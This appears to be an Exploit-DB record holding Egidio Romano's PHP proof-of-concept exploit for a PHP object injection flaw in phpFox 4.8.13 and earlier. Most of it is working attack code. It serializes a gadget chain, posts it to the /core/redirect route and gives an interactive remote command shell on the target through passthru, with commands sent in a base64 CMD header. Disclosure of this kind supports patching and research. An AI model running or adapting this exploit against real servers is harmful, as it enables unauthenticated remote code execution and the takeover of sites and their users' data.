{"source": "https://www.exploit-db.com/exploits/51799", "vulnName": "phpFox < 4.8.13 - (redirect) PHP Object Injection Exploit", "vulnEDBID": "51799", "vulnCVE": "N/A", "author": "EGIDIO ROMANO", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-19", "vulnContent": "<?php\n\n/*\n    --------------------------------------------------------------\n    phpFox <= 4.8.13 (redirect) PHP Object Injection Vulnerability\n    --------------------------------------------------------------\n    \n    author..............: Egidio Romano aka EgiX\n    mail................: n0b0d13s[at]gmail[dot]com\n    software link.......: https://www.phpfox.com\n    \n    +-------------------------------------------------------------------------+\n    | This proof of concept code was written for educational purpose only.    |\n    | Use it at your own risk. Author will be not responsible for any damage. |\n    +-------------------------------------------------------------------------+\n    \n    [-] Vulnerability Description:\n      \n    User input passed through the \"url\" request parameter to the /core/redirect route is\n    not properly sanitized before being used in a call to the unserialize() PHP function.\n    This can be exploited by remote, unauthenticated attackers to inject arbitrary PHP\n    objects into the application scope, allowing them to perform a variety of attacks,\n    such as executing arbitrary PHP code.\n    \n    [-] Original Advisory:\n\n    https://karmainsecurity.com/KIS-2023-12\n*/\n\nset_time_limit(0);\nerror_reporting(E_ERROR);\n\nif (!extension_loaded(\"curl\")) die(\"[+] cURL extension required!\\n\");\n\nprint \"+------------------------------------------------------------------+\\n\";\nprint \"| phpFox <= 4.8.13 (redirect) PHP Object Injection Exploit by EgiX |\\n\";\nprint \"+------------------------------------------------------------------+\\n\";\n\nif ($argc != 2) die(\"\\nUsage: php $argv[0] <URL>\\n\\n\");\n\nfunction encode($string)\n{\n        $string = addslashes(gzcompress($string, 9));\n        return urlencode(strtr(base64_encode($string), '+/=', '-_,'));\n}\n\nclass Phpfox_Request\n{\n private $_sName = \"EgiX\";\n private $_sPluginRequestGet = \"print '_____'; passthru(base64_decode(\\$_SERVER['HTTP_CMD'])); print '_____'; die;\"; \n}\n\nclass Core_Objectify\n{\n private $__toString;\n \n function __construct($callback)\n {\n  $this->__toString = $callback;\n }\n}\n\nprint \"\\n[+] Launching shell on {$argv[1]}\\n\";\n\n$popChain = serialize(new Core_Objectify([new Phpfox_Request, \"get\"]));\n$popChain = str_replace('Core_Objectify', 'Core\\Objectify', $popChain);\n\n$ch = curl_init();\n\ncurl_setopt($ch, CURLOPT_URL, \"{$argv[1]}index.php/core/redirect\");\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\ncurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\ncurl_setopt($ch, CURLOPT_POSTFIELDS, \"url=\".encode($popChain));\n\nwhile(1)\n{\n    print \"\\nphpFox-shell# \";\n    if (($cmd = trim(fgets(STDIN))) == \"exit\") break;\n    curl_setopt($ch, CURLOPT_HTTPHEADER, [\"CMD: \".base64_encode($cmd)]);\n    preg_match(\"/_____(.*)_____/s\", curl_exec($ch), $m) ? print $m[1] : die(\"\\n[+] Exploit failed!\\n\");\n}\n            "}